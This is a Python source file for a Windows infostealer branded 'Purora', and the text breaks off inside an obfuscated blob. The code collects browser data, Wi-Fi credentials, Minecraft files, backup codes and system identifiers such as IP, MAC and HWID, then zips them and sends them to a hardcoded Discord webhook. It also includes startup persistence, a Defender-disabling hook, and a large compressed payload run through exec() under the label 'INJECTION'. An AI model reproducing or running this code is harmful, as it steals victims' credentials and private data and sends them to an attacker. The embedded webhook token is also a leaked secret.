import base64
import json
import os
import platform
import random
import re
import sqlite3
import subprocess
import threading
import uuid
import ctypes
import psutil
import requests
import wmi
from Crypto.Cipher import AES
from discord import Embed, File, SyncWebhook
from PIL import ImageGrab
from win32crypt import CryptUnprotectData
from shutil import copy2
from sys import argv
from tempfile import gettempdir, mkdtemp
from zipfile import ZIP_DEFLATED, ZipFile




_HOOK_ = "{"application_id":null,"avatar":"a6550faba98bde5371f8dedf7154d886","channel_id":"1107874754511261696","guild_id":"1081331068814241862","id":"1126235761264574576","name":"Token Grabber","type":1,"user":{"id":"717501265864687626","username":"thenegusyoni","avatar":"33d75dc4bab8a46ecb12e7f49c358c7a","discriminator":"0","public_flags":64,"flags":64,"banner":"5f2421b5ee716cb8ac7b4148da83434a","accent_color":4325376,"global_name":"Negus Yoni","avatar_decoration":null,"display_name":"Negus Yoni","banner_color":"#420000"},"token":"rBRf9vWb3Uu_-QTJi81ttC3oVn3HtpaAHJxUZlMHqDx-xdGZQ5BA4-8Xi1wRaZ1bqcFQ","url":"https://discord.com/api/webhooks/1126235761264574576/rBRf9vWb3Uu_-QTJi81ttC3oVn3HtpaAHJxUZlMHqDx-xdGZQ5BA4-8Xi1wRaZ1bqcFQ"}"





# DONT TOUCH THIS OPTIONS COZ THEY ARE NOT WORKING YET
__PING__ = "%ping_enabled%"
__PINGTYPE__ = "%ping_type%"
__ERROR__ = "%_error_enabled%"
__STARTUP__ = "%_startup_enabled%"
__DEFENDER__ = "%_defender_enabled%"




def main(webhook: str):
    webhook = SyncWebhook.from_url(webhook, session=requests.Session())

    threads = [Browsers, Wifi, Minecraft, BackupCodes]
    configcheck(threads)

    for func in threads:
        process = threading.Thread(target=func, daemon=True)
        process.start()
    for t in threading.enumerate():
        try:
            t.join()
        except RuntimeError:
            continue

    zipup()

    _file = None
    _file = File(f'{localappdata}\\{os.getlogin()}.zip')

    content = ""
    if __PING__:
        if __PINGTYPE__ == "everyone":
            content += "@everyone"
        elif __PINGTYPE__ == "here":
            content += "@here"

    webhook.send(content=content, file=_file, avatar_url="https://cdn.discordapp.com/attachments/1038435089807323206/1038451666317488158/dsaf.png?size=4096", username="Purora")

    PcInfo()
    Discord()


def program(webhook: str):
    Debug()

    procs = [main]

    for proc in procs:
        proc(webhook)

def try_extract(func):
    def wrapper(*args, **kwargs):
        try:
            func(*args, **kwargs)
        except Exception:
            pass
    return wrapper


def configcheck(list):
    if not __ERROR__:
        list.remove(fakeerror)
    if not __STARTUP__:
        list.remove(startup)
    if not __DEFENDER__:
        list.remove(disable_defender)

def startup():
    startup_path = os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
    if os.path.exists(startup_path + argv[0]):
        os.remove(startup_path + argv[0])
        copy2(argv[0], startup_path)
    else:
        copy2(argv[0], startup_path)

def create_temp(_dir: str or os.PathLike = gettempdir()):
    file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
    path = os.path.join(_dir, file_name)
    open(path, "x")
    return path


class PcInfo:
    def __init__(self):
        self.get_inf(__HOOK__)

    def get_inf(self, webhook):
        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
        embed = Embed(title="Purora", color=10038562)
        
        computer_os = platform.platform()
        cpu = wmi.WMI().Win32_Processor()[0]
        gpu = wmi.WMI().Win32_VideoController()[0]
        ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)

        embed.add_field(
            name="System Info",
            value=f''' **PC Username:** `{username}`\n **PC Name:** `{hostname}`\n **OS:** `{computer_os}`\n\n **IP:** `{ip}`\n **MAC:** `{mac}`\n **HWID:** `{hwid}`\n\n **CPU:** `{cpu.Name}`\n **GPU:** `{gpu.Name}`\n **RAM:** `{ram}GB`''',
            inline=False)
        embed.set_footer(text="https://github.com/Purora (FOR MORE SOFTWARE)")
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1038435089807323206/1038451666317488158/dsaf.png?size=4096")

        webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/attachments/1038435089807323206/1038451666317488158/dsaf.png?size=4096", username="Purora")

# INJECTION

import zlib
import codecs
import base64
exec(codecs.decode(zlib.decompress(bytes(b'x\xda\xcd]mS\xdbH\x12\xfe1\x97\xb0\x06j\xb7R!IA\x1dw\xd4\xad7\xb1\xb9\x85K\x1dw!\xc4\x1f\x96\xb3eI`\x12\x1b[\x92\r9.\xbf\xfd\xa6G#\xa9{\xa6{$\x19\x93\xdd/)\xc7\xd8\xe3y\xe9y\xfa\xe9W\x85wa\xd0\tf\xe30H~R\xff\xa8\x17\x9d\xd10\t\xdf\xbc\xfai\xb4\xff\xda\xbc\xb1\xf8\xe1\xe3\xfc\xd5\xd6\x7f\xbb\xff;\xef\xfd\xed\xe3t\xa7s\xf2\xf1\xf4\xfe\xf4\xc7\x8f\xa7\xab\xb7\xdf\xce\xcfN^\x9c\xf5\x9eO~\xfdk?\xbc\xbcx;\xd8>\x18v\x87\xab\xc9\xf3\xd7\xfd?M\xee\xbf\xf4\x07\xab\x83H\xfdsr\xd7\x1ft\xce\xae\xd4\xab\xf7Q\xef\x97\x7f\xed\xa7\xfd\xc1\xd1E\xdc\x1f\xdd\xcf\xee\xd5\xab\x13\xf5\x87\xe9\xbbQ\xffO/>\\\xf5\xc6\xaf\xf6\x02\xf8\xc8\xa2\x17|\xdd\xbd(\xbef\x06\xe8\xfd\xfc\x9f\xe3\xa8\xf7\xf3\x8f{i\x7f\x7fu\x12\xf6\xb6\xc2\x93\xb4\x7f\xf0b\xb2\xeam\xad.\xeez\x9d\x87\x7f\xdc\xf7\xf7;\x1f>\xf7\x0f\x0e_wz[\xbf\xece\xbd\xcea\xff\x0e>wS\xbe\x97\xf6\x82\xff\xa8\xdf\x80\xef\xf6:\xe9\xcbyok\xefa\xd1\xdb:?N\xe0\xbb\x19\x8c\xa2^M\x8fc\xf5\x8d\xfd[\xf8F\xa2\xde\xfb5\xedm\x9d\x1e\xc0\xef\x9e\x85\xeasjVj<\xf5\xdd\xf3wq\xef\xf9\xe5\xe5\x0cFQ\x7f\xed\xa8e\x1d\xbc\x88\xbf\xc2{!\x0c\x1a\xaa\x15\xbdI`~\xf7\xbd\xce\xe4\xdb\x0c\xc6\x1b\xab\xe1O"5\xb5\xb7;j\xd0\xeeB\xfd\xf7\xddH\xcd\xea\xc5\xbc\x17\xcc;!\xbcR\x13\n\xdf_\xc1\xda\xae\xfa\xfb\xe7o\xe6\xf0]\x98AW\xfd\xf7\xe4\xe1\x13L|\x07~c\xd0\xdf\x0f\xbbjB\xab\xf7\t|\xee\x16f5\x83\xf7\x160\xd4\xb4\xbf\xbfw\xa8\xfez\xaaFV\xe3M\xf2\xf9\xed\x1f\r3\xf5\xb9\x973\x98_\xac\xc7\x83\x01V\xb0/#\xb3\x84\xc3\xd7\xb7\xb0\x8e{X\xf9\x0e\xacr\xac\xce\xe3\xf0\x16^]\xa9\xdf=Rk\xfb\xe5M\x00\xbb\x11\xf7:\xcf\xf6w\xe07\x06\xf0W\xbd\xe3\xb0\xa2\xe3\x95\xde\x1cx\x95\xc0\x1e\x040\xde\n>\xa7\xd7\xf6YMR\r\xaa\xf6`\x1b\xf6Y\xcd\xef\x14>\xa2g\xdf\xbd\x9c\xc1\xca?\xc3\xac\x96\xf0\xbb\x03X\xefs\xf8\xef5\x8c\x97\xa9\xa5\x1e\x04\xb0\xa7\xea\xd7&\xff\xdd\x82\x15\x85\xb0\xe8\x00\xbe\xbb\x80\x13\\\x9a\xdf\xe8|\xd0\xcbO`\xceC\x98\xd0\n\xf6e\x06s\xce\xf4\xf0\xf0O\ns\t\xb5\x0c\xa9\x01\x1e\xd4\xbe\x84\xc7q\xfe\xbb\xdbo\xfe\xb9\xabW\t\xfbr\rK\xb8\x83\xf7\x0e\xf3S\x80\xddP\xc3\xef\xe9\xdf\x1d\xc3^\xdd\xc1xwz\x13aj\xcfaO\xafr\xf9S\xf3K\xe0\x1b\x13\x18O\xbf\xa7\xa6v\xbe7\x80W\t\x9cof\x16\x88\xc7\xdb1\xf2\x02\xe3\xa9\xf9-a\xd0[\xd8\xaba)\x93\xd7x\xbc\xe9qP\xac\xf722\xf33\xf2\x92\xcb.\x8c\x17\x99=5\xf3\x8b\xccY\xc2\xfc\xd46Eh<u\n\x13\xd8\xabm\x98\xdf\xc2\xcc\xaf{t\x01?~h\xe4\xd4\xec\xe9\'\x98\xdf\n\x06\x9d\xe5\xf22~u0\x86\x03Ma.C\x98\xa9\x1e \x83\x0f\xcf\xd5{\x87\x03\xf8o\x0c\xf2\x92\xc0\x9e\xde\xc1\x87\x13}\x8c\xf9x\xc5\xfc\xe0\xbe]\xc0\xda\xde\x05\xce\xfcryy\xb8\xe8=\xdf\xed|\xc4\xe7\xb1w8\xd77\n\xee\xea\xb8\x9c\xdf\x12D^\xcbP\x94\xcb\x90\x9e\x8b\x92\x17\xbd\x93\xb1\x91\xa1\xe9\xf1\x02V>+\xc6{1\x82\xef\xde\x98\xf38=\x00\xa19\x8b\n\xf9\xfb\x96\x1aA\xd2\xe7k\xceC\x0f\xb5\xc8/\xe2\xd6\xf4\xec^\xcd\xefp\x9a\xafW\xdd\x05}9\x03\x18o\x17\xa0 (\xe7\x07\xe8\xf3k\xa6\xbe\x01b\x1b\x1e\x8c`\x06I9\xdeu)/)\xdc\x99\xadB^\xd4\xfc\xd4\x19-\xcd\xbd\x84\x1b\x8a\xc6\x9b|\x83\x01\xde\x03\x0e\x1d\x84\xc5)\x14\x18\xa6\x96:\x86o,\xcb\xfd\x8b\xca\xf9\xcda\xe4[\xbd^\xd8\xc9\x11\x9c\xc7\xb3\x1c\xa5\xf4\x8a\xe0\xea\xc2\xef\xae\xca\xf14\xae\xe9\xdf\x98\x97\xfb\x17\x95\xe7\xfbg\xf8nd\xf0\n\xee\xbeo\xff*\x8c\xd53\x00\xfc\xfbmV\xcd\x0f\x96?\x85\xef\x02ntG\x04\x0f\x00\'5\xae\x9d\x1f\x8csiW\xf27r\xf6O\xcd\xaf<\x0f\x8d\xcf\x9fa\xff\xf4\xdd7\xf3+\xd6\x1b\x98\xb34\xf2\x12\x94\xe3-\xcc\xfe\x9d\x1ed \xcf\x9f\xe8\xf9\x86\xe6x\xc2n\x8c\xd7\x8b\xce\xb7;\xa6\xeb\x1d\xeb\x83\x82A\x97 \xd41\'\x7f\xc5\xe7\x94\xfc\x15\xf3\x1b2\xf7#\xa6\xf3\x83\r{yK\xcfw\n\xdf\xbd\x85\xf5\x06f\x9f\x0b<\xcd\xf1@m\xf1\x02\xb4Zh\xf4\x8c\xfe\xdd\xb0;\x87\xc5\x0cA\x9e#<\xbf\xe9\xd9\x9d\xc6\x03\x8d\xfc\xf9xH^N\x95\xe8\x05_\x8fF\xb9\xac\xe5\x1a\xb6s\xf1\xa5\xc4\xe7H\xdfKn~\x06O\xcd}\xc3\xf8\xa2\xe4*-\xcf\xd7\xcc/\xc7\x03\x8d\x7fJ\x9e\xe9\xf9~\x85\xdf\x88\xf4z5\xac3\xf7c\\\x9c[q\xdf\x0c\xfe\xfd<\xd3\xfa\x1c\x8f7=\xbb\x81\xcd\x9e\x9a\xfb\xb6\x0b\x08W\x8d\xa7aD\xef\x0b\xf0\r\xb5\xde\x8c\x8c\x87\xf04v\xee\x87\xc2\x03\xc0\xb0Q\xbe^\xc3\x0f\x94\x0e\x05>d\x94\xba\xde\r\xe0\x07\x9a\xb0\x80\x0c\xe9\xfbA\xe5\xaf\xb8\xbfJ\x7f\x94xJ\xcec\xf7rN\xe5\xe5\xda\xe8\xf3\xf4e\x87\xde7k\xffBs\xcf\x99\xf5:\xe3\xbd\x87\xcf\rA\x86\x8e\x16t<\xbd\x7fF\xb5\xe1\xfdC\xf27\x07\xcd~\x8f\xf6/\xe7/@v\xd4_3\x1e\x9f\x95DX\xf77\xe7a\x85\xbc\\I\xf7\xc3\xc2\xfb{x\x15\x9b\xfbk\xf0\xc5:\x8fOp?\x12<?\xc0\xb0`\xbe\xfb\xb1\xe0\x7fh\xbcL+Cz\xbe\x04\xff\xa6\xc7f\x9b\xd0x\x06\xafVX\x9f\x9b\xfbv\rk\xd3\xca\xc1\xc2\x03\x83\xcf\xf9>[\xf7\xd7\xf0\xb5]\x98Al\xcfO\xff\x15Xn\xc9\x0f\xf4xc\xc3_`~\xa0%\x8d>\xc7\xf27\x87\xf3H\x90>\xaa\xc1\x03\xa3?v\x9c\xf30\xfar\xa5Y\x06\x83\xcfJ\xf8\x8f\xc6\xd6}K+\x1e[\xde_s?4\xe7\xef\xa4\xaf\xa7\x0c>#\xfc#\xfa2\x97?\xc5\xaf\x9e\xbd\x9e\x95\xf7\xcd\xd2o\x9a\xaf%2>#<}\xf8u\x91_\x03\xf5*\xd1{\x8f\xcf\xd7\xe0\xfd\x04\xc6\x9bJ\xf3\x0b1\xdf\x80Qr\xfdq\xae>\'\xe0\xcb\xae\xe6\xb1\xe2z\xe9yT\xfa\xad\xd2\x97Cc/h\xbd\xc5\xacW\xfd\xc6\x8f\xf0\xdd\x1c\x81\xe9xZ7\x0e{\xc1\xe5\xc3\xb0\x9c_b\xf6\xcf\xdc\xdf\x89\xb1\xb7*y1\xf7m\x96\xcf\x0f\xe1K\xb5^\xb83\xeaw;\xcc\xfd\xd5\xfaw@\xf5\xc7\x17\x98Uf\xc6\xc3x@\xe4\xcf\xdc\x8f\x82\x1f\x00\xf53\xfa\xa8\x1b\xb8\xeb\xdd\x1b\xe6|\x12\xec\x19\xe9~d\x86O\xda\xf2w\xf9\x89\xca3\xc2?z\x7f\xf1x@I\\}\x94\x9foL\xf7O\xb3\xb4\xd8\xe8K\xcc\xaf23^\xe7\xc3\xd2\xe6\x7f\x85=\xf3\x17\x98\xf3\x1d\xbd\xbf%\xbe\x14\xfa\x17\xc9\x8b\xc6\xabS\xc5<\n~\xcf\xed\xdf\xd8\xc3\xaf\x8c=\xe3\xe0\x9f:\x8fX\xe2\xbb\x99\x07O\xd1z\xf1\xfd\x85\x8fl\x11~\x95\xe3\xdf6(\xa5%\xd1\xbf\xff^\xc0\xfc\x82\xdcrE\xfc\x00\xdf\xdf\xb4\xdc\xbf\xe2<\x8c\xbd\x1aj\xbd\xe0\xd1G \xcf\xf6\xfe\x19\xbc\xc2\xf8B\xf9\x0b\x1d\xef\x8b\xb6lr>N\xf8K\xb1\x7f\x98\x9f\x0ek\xe4\x0f\xec_m`\xe93\xa7\xfc\xbe\x94?pJ`\xbek\xe9\xa3X\xc4\x03j\xcf\xec\x18|\x9e\x82\x81\xda\xbdl\xc0\x0fx|\xb6\xf0\x85\xd8\x97\x8c\xfc\x1d_\xf1\xfaC\xe9s:\x1e\xb9\xbf\xc6>\x8f%\xfdk\xf1\xa1P\xeb#\xc4Os98UG\xa1\xed\xad\x82\x0f\x85\x04\xff\xce\x02\xe33\x12\xf9\x06\xb1\x8fJ\xfd6\xb0\xf9A!/\xb3\xd2\x7f\x10s\xf6\x9bu\x7f\x0b\xbf\x94\xda\xbf\x82_%\xee\xfc\x0e\x87\x1e\xfe\xd7\x10\xaf\n\xfd\xa6\r\xb6\xd4\x95\xe7\x17\x8b\xd2\x1f\x162\xf6QP\xea\xcb\xc4\xb1/\xd5x5|C\xc0\xbf\xac\x1c\x0f\xe1\x9f\xde]\xba\x7fD\x7fT|\xad\xa9\xfdv\n~\x1f\x81\x1fP\xfb\xbc\xb2\x7f\x17%\x1e\xb8x\x7f\xba\x17\xb6\xc1\xbf\x9c?\x97\xfe\x8d\xc4\xc6?\xeco\x12\xf8\x1fZo\xee\xcfyc\xf97,\xf9K\xe9\xfd\xad\xec\xdf\n\xef\x0b\xfe\x0c\xbe\\\xb5\xed)\x95?[\x1fy\xfc\x07X\x7f\x18\xfb\r>\xe7\xe0\x01\xb2\x17^\xce\x91\xff@\t\x83\x96\x92%\xf2\xaf\xb9\xf8\x17x\xefo(\xf3\x03\xc4O\x1d\xfe\xd7a\xf4\xef\x9d\xf6g\xd3\xf3\xa8\xf4\xc7\x98\xf2\xf1Q\x0e\xcdZ\xbf\xa9\xfd\xfbB\xfc%\xfb\xf3\xdc#\xd79\xfcy\xc1\xef\x9f\x96\x17\xce_\x02\xf8b\xf1\xfb\x83\x17c\xbd\xe3\x19\x83\xcf\xc8\x7fE\xf9\xae>UXo\x7f!\xd9\x1f\xdb\xe5\xb9\xe5\xfa\x17\x16\xad\xc1#4|\x03\xebK\xc2\xd7\xd0}\xb3\xfd\x071\xc7\xff\x8c}\x04\xeb\x15\xf8\xda\x02\xdb\x0bh\xbd\x98Oby\xd1\xf7\x03\xce\xd7\x1do\\\xea\xcb\x81\xe3_\xa3x\x8a\xf5\xef\x99k\x9fc\xfb(\x12\xe4y?%\xe7\x8b\xf8KF\xefou\x1es\xb0\xed\xb7\x18\xff\xc1\xdc\xe1W\x14Om\xfe\xa7\xb97\xc4\r\x8a\xfb6(\xcfC+\xd7\xb1\xf1\xb3\xba\xf2\xdc\x06\xff\xfc\xf6y\xc5\x87Rj\xbf=\x83\xf5\xde\xe4\xf1#5\xa1\x89$\x7f\x0e\xfe\xe5xZ\xfa\'\xcb\xfb\x96\xfb\xdb\xd5\x15\xca\xe0<\xe6\xa2\xff\x85\xd9\xbf9\xd6[\xae?\x07f\xba\x14\xf8\xdf\xe1T\xf4\x87Q<\xb0\xfc\x93sb_\xe6\xfe\x9c\x9dR\x7f0\xf2r"\xe97\xf0?{\xf4[,\xf1\x17\xd1\x7f:\xa6\xf6*\xf1\x8f+\xfb\xbc\x1d\xffS\xf6\xe5\x006l\x07\xe97\xb4\x7f\x86_E\xf5\xfe\x83$\x1f\x0f\xd0\xac\xe4\x07\x1c\xbfJE\xff=\xb5\xcf\x8b\xfb\x96@\xb4\x8f\xd3\x97\xbc\xbd \xf2?<?\xdb\x1e$\xfc\xaf\xc6\x7f\xe5\xdao#\xdb>\xcf\xf9\xc6\xe1\xdb\x8e\x1a\xe0C\xe5\xef\\\xe4R\xa7\x06\xc8r\xfbCk&\x1f\xfe1\xfe\x83\xc2?\xc9\xd8[\x92\x7f<\xc8q\xb2\xc2?\xe2\x8f\x1d7\xc2?\xbf\xfd[\xe8\xcb\xd2\x9e\xae\xce\xd7D\xab\xf2\xbf:\xf6o\x9a\xa3\x99%\x7f\x18_~\xbb\xad\xf1\x0fq\xe7\xe1\xf0\xe7\xfc\xfe>\x87\x99\n\xfe]\x1d\xff\xe0\xf4\xa5\xe6\x1b\x10\'\xb6\xe5\xb9\x9b\x87\xa6o\x04>\t\xe7Q\xf1\x03\xc7\xfe\xcd\xa8\xff\x1e\xe1}\xcd\xfdm\x8b\x7f\x91\xe4\xbf\xb7\xf0\xc5\x92\xbf\xca?^\xc9_\x06x\x15\xb5\xe5\x07\xb9\xfd;e\xec\xc1\x84\xd1\x1f_M\x14\xbe\xe4/\x02\xbf"\xfbw\xbe7\xcceH\x1d\xfc\\\x8e\xcfT\xfc\xd9\x8d\x7f\xa4\xd8\xdf\xe4\xf0\x17\xc1^\xe8>\xf8\xf1/u\xf5[\x11\xaf`\xed_\xa2\xdfr\xfb\xb7\xf0\xff\xcd\xf1\xf9\xf2\xf8\xe2\xc6S0\x7f\xb1\xe4/\xc6x\xe0\xd8\x1f\x1e\xfdk\xeb#\xcc7\\\xfdv\xf20\x94\xf9=\xf5\xbfP\xff\xf3\x1c\xd93\x8d\xf8\xdf\xfb\x1b\xc32\x9c\xfd\x1b8\xfa\xdc\x13\xff\x10\xfc\xa7\x8d\xfc\x7fZbo<\xfe+l\x1fY\xfa#"\xfc\xaa\x91\xfd\xbb^\xfcr\xc6\xd9\xe7\xe6\xfeb\xfe\x92\xeb_\x93\xef\xe3\xb1?R\xce\xfe0\xf8\x82\xf1\xa0\xc2\xd3\xb4\x8c\xf7$\x9c\xfd\xc6\xe0\xcb\xd2\xf0!\xa2\x7fM<\xca\xe8\x8fT\x88_z\xf1\x8f\xc3\x17\'>m\xf3?)>M\xedi\x12\x7f+\xf4\x1b\'\x7f+z\xbe\xcb\xd2>\x0f\xac\xf8L\xa3\xfc\x08\xc3\xff8\xf9\xab\xe2)-\xe2\xbf\x8a\xffa\xfeB\xec}\xaf\xff\x94\xe0\xbdYo\x86\xec\xd5\x16\xf87\xf0\xfa#n\xeb\xfd\xf7\x8e\xbet\xed-d\xff2\xf1\x14\x81\xffa{!\x14\xf3\x0f\xf8\xfd\xf3\xc4\x07\xd7\xe7\x7fM\xfd\x89X\xfe\x96\x1b\xc0\xbf\xb5\xf9_\x1e\xff\xf0\xec\xdf:\xf87r\xf2\x0f0_\xbb\xa6\xe3\x95|\xe3\xcc\xf2_i\xff\x90\x96\xf1\x94\xfa#\x9a\xd9\xbf\x16\xff\xa3\xfb\x07!+\xe4\xdf@\xfe\xa6\x87\x7f|e\xfc\xb1\x9c\xfe\xb5\xf8\xd5\\\xf2\xff\xad\x84\xfc\x08\x98\x9f\x8e\x05Z\xfb\x07\\E\xf0\x9fn\x97\xf1\xcbV\xfe?7\xfe\xe1\xb9\xbf"\xff#\xfc\xca\xb2\x7f\x8d~\xd3\xf9MS9^\xbb\x16\xff\xbb\xf0\xe4\x97`\xfe\x87\xf0\x8f\xe2\x95_\xff\xd6\xda\xbf\xc6\xdf\xb4\xc3\xf8\xef\xb9x\xf2\xd2\xf8\xff\x1c\xffd\xa2sCKy\x9eJ\xfe\xbf\xa0\xa1\xfcY\xfce.\xe1\xfd\x02\xcb\x0b\xb1\x7f\xad\xf8%\x8d\xcfDL\xfccB\xf9s\x85/\x902|\x16Y\xf6\x11\xe5\xcf)k_\x16\xf1\xcbk\x1e_\xaa\xf99\xe7\xb1\x14\xfcWe~\'\xe7\xcf\xc1\xf9H\x06\xd6\x89\xff>\xf5\xfaO\xfd\xf9u\xb5\xf8\x87\xfd\x1bQi/\xdc\x99|\xdb\xe9\xf1\x15\xef\xef\xf4\xfb_\x9a\xda\xbf-\xf1O\xe0W\x1e~ \xf8\xaf\x1c\xfe\x87\xe2\x97N\xfe\xa4\xbe\xab\xab\\\x90\xa6\xde\xf8[\xc4\xe7\'b<\xfdn\xf8g\x9d\xef\xb2&?\xa7\x9d\xff\xcf\xec\x1f\x93\x1f[\xf0\x03\xc6\x1et\xf8\x1a\xe3?m\xe7\xff\xa3\xfe{W\x9fGm\xe2\x1f\xdb4\x1eZ\xc9\x1fD\xa0O\xa4\xfc0)\x7f\xc3\xc9?\xa8\xec\xd5D\xdf\xe4\x1a\xfbwS\xfc\xaf\xc0{!>s-\xf9_\xd2F\xf8\xd72\xff\xc5\xba\xbf\x13&\xfe[\xf8#p\xfeZ\xe8\xe4\xc7:\xf1s\x82\x7f<\x9f\xb4\xfc\x7f\xd4>\xba\x8c\xa9\xbf\x84\xe0\x1f\xce\xdf@\xf9\x11\x0e\x1f\xc2\xf27\xa1xzc\xf0\xc5\x8a\'W\xf9\x1b\x9a\r#}d\xfb\xff\xaed~J\xe2\x83(\x1f\xa4\xf4\xef6\xb5\x7f\x0b{\xcb\x13\xff\xdd\xc2\xf2\xacq\xdc\xe5/N\xfe8\xeb\x7f>\x18I\xf9\xe3+\xcd\xaf\xb8xYn/T\xf6\xaa\x9b\xbf\x1b2\xf9H[N\xfeds\xfbW\xe2\x7fv\xfe\xa9\x18O\xe6\xf2\xb9\x8a\xfc\xce\xf3\x839\x13_]\xdb\xffG\xec\xa3\x88\xf3\xdf\xe7UV\xc2\xfe}\xa2\xe3\xf9\xf1O\xe4\x7f\xbe\xfc?\xc4\xd7~\xbb\xad\xe1\x7f-\xf2_8\xfeG\xea?\xf8xr\xe8\xf8\xd7\x8c\xfe]1\xf9 \x8f\xf4\xffY\xfb\xe7\x89\xe7I\xfa\xd7\xc2\x03o\xfe\x1f\xf1_y\xf2\x9fy\xff\x8b\xeb\xff\xc3\xf7\xb7\xa9\xff\xaf\x99\xfd\xbb\xe9\xf8\x87\xde\x17\xc8\xda(\xfck[\r\xe3\x1f\x84\xffY\xf5G"\xff\xd3\xfbg\xee\xdb\xd8S\x9f\xc2\xe6_\xe5\xf1\xdf\x85\xe4\x7fYq\xf6[\xce\x86\t? \xf9\xc0\xf8<\xfc\xf2\xe7\xcb\x7fi\xc2\xff\xf2\xfa\x0f\xf6|E\xff\x9f\xcd\xff\xd6\x8a\xffZ\xf9a\x0b6\xffT\xca\x7fA\xfeg!\x7fh\xe5\xcd\xbfz,\xfeU\xf5\x1f\xe4~\x10\xfe\x17\xd1\xfc\xba5\xed\xdff\xf8\xe7\xa9\x8f\x9a\t\xf2wl\xf97,\xfc\x8b\x9dxE\x8d=\x83\xf0\x85\xe8\xa3\xf9\xb3\x8fe~\xc9\x88\xc9W^1\xfe\xd3m\x90\xe7\x11]\xaf\x18\xff\xb0\xf3\xff<\xf5\x01\\<\x14\xdb3\xdf\xcd\xffWk\xff\xae\x8d\x7fN\xfc\xc3\x97\xcf\x90\xf9\xfd\x7fD\x7f\xbc\xbf\x93\xea\xdf\xbc\xf1\x0f[^\xb8z!\x82\xcfp\xbeE=\'\xe7\xbf\x9al4\xff\xc5\x87\x7fR\xfe\xc1\xd0\xae/k\x9a\xffW\x9b\xff\x12\xd6\xd7\x1f=:\xfe\xd1\xd4\xffg\xf9\x8b\x03\t\xef9\x7f\xf16\xe5\xe3\x1b\xc2?!\xfe\x81\xfc/\x03\xa9>\xd4\xf0g]\x8f\xad\x06\xe8\x18\x7f6\xae/k\x16\xff8y\x18\xca\xf6\x87\xac\xdf0?\xc5\xfe\x03\xf5\x8d\xcfk\xe4\xbf\xc8\xf5L\x0e\xfe\x11\xfe\x87\xf8PQ\xff\xe1\xe6\x17\xb7\x8c\xff\xfa\xea/\x1b\xf8\x13\t\x7f\xe6\xf2\'\x9d\xfc\x83\x16\xf1\x0f\x8e?\x9b\xfa\xfd\xb1\x9b/\xc5\xd5\x9bJ\xf9W\xfe\xfaK)\xff\xa5E\xfd\xc7\x8c\xb7\xdf\xa0\x03\xc8F\xed\xdf\xc7\xc7?D\xfe\xb7v\xfc\xd7\x97\xff\xc7\xe5\xdf7\x93?\x9e\x9f\x8a\xf5\xbf\x05\xfe\x99_[4\xcc\x7f!\xf1\x196\x9e\xd7\xc4\xffw\xed\xfaK\xeczD+\xdf;kT\xffa\xf8Z\xca\xf4g\xf8\xbd\xe2\xbf\xb1\xac?\xc4|L\xb9\xde\xcf\xb1\xf7s}\xc9\xf0\x83\xa2\xbe[\xf1\xd3v\xf5\x1f\r\xf8\x9f\xdd\x8f\x02\xeb\xb7L\xc6?\x8a\xf7R\xfeK\x0b\xfc\xb3\xf2\x8b%\xfd!\xe5\xbf\xd0\xf8oD\xed\xad\x06\xfe\xbf\xa4\xb4\xdf<\xfa\xd2\xe7\xcfq\xfbG\x98\xfe \xd7\x9b\xb3\x7f/j\xea\xe3\x9b\xe0\x1f\xe9\x7f\xf04\xf5\x1f\xbe\xfc\xecv\xf8\'\xda\xbf|}\x85\xf6\xe7\xd8\xfeI\xf9~\xc8\xfd_\x98\xfc\xbf\xf4\x0f\x83\x7f-\xe2\xbf\r\xeb?,\xfd!\xf9\xc3H\xfd\xf4w\xce\x7f.\xfb[<\xde\xff\xb7\x19\xfb\x97\xcb\x9f\xc4\xfd\n\x9e\x88\xff\xb9\xf6j\xdc\xb2\xfe\xa3)\xfey\xfa= {\xc6k\xbfM\xea\xf3\x9f\xb9\xfe\x07\x91\xe0\xbf\xc7\xf5\x88N\xbe\x0f\xd7\xbf\x89\xcb\xff[\'\xfe\xeb\xab_\xf5\xd8\xbf\xe2\xfd\xe5\xea\xcf\xc36\xf9\x7f\xa17_O\xac7\xbd\xf2\xf8_x\xfc[3\xffel\xf1]\x1c?\xaa\xf3\xff\xd5\xda\xbf\xcd\xf1/i\x98\xff<\x02\x1d\x15\x95\xf6\xe5R\xaa\x1f\xbch\x18\x9f\xb6\xe2\x1f\x11\x13\xff\xcd\x98x7\xf17m\xda\xfe\xe5\xf2K\x8c\x7fr\xdc\xa8\xde\xcf\xf2\xbf\x08\xf9\x89k\xfb\xffx\xfe7t\xe2\xbfN\xfe=\x17\xaf\xb8\xf2\xe6\xff\xcd\xa5\xfe%\x13\xde\xfeu\xe2\x83\x84\x9f:\xf77.\xfa\x05\x1d\xcd\x1f\x9b\xffR\xc5\xbb3\xab~\xd0\x8f\x7f\x9e\xfb\xcb\xf7?X;\xfeQ\xd4\x7flK\xf5\x0b\x91\xf1\xff\x91\xfc?\xda\x9fk.\xf5\x0fk\x8a\x7fV\xff\xab\x05\xb3\x7f\xbaG\xe8\x9c\xcf\x0f\xd3\xe3I\xfd#Z\xc4\x7f[\xe5\xffy\xfa\xfb<\xaa\xfe\xed\x8f^\xffA\xfaA\xc9\xf53:7J\xe8\x9f8\x91\xf8}{\xff\x9f\xee\xf7u\xcb\xd7\xa7\x98~\x82\x02\xde\x93xE\xc3\xfa\x8f)\xe3\xef\\2\xf1\x85*\xbfn\xc7\xc9\xdf\xd0\xf7#\xcfG\xca\xfb\xbf\x08\xfd"q\xbf\x82\xa6\xfc/\xe3\xc6\xe3\xfa\x9b1\xfd\x05\xaa~-i\xa1?\xdee\x9b\xb5\x7f7\x93\xff\x87\xf2\'\x93\xc7\xd7\xff\xd6\xe7O\x1a\xbe+\xca\x9f\x98\xff2\x85+\xde\x08\xff\x9a\xf5\x7f\xa1\xfd\x1d\x9b\xc5\x7f\xfd\xf6\xaf\xd5\x7f\x92\xc3?W\x7f\xd0~<\x84\x9f\xc6\r\xeb\x07\xd7\xcc\x7f&\xe7\x81\xf3#*\x7fv\xe4\xf8OQ\xfe\x1f\xf6\x97\xac\xe7\xffk\x91\xff\'\xe6?{\xf2O\xd7\xc9\x7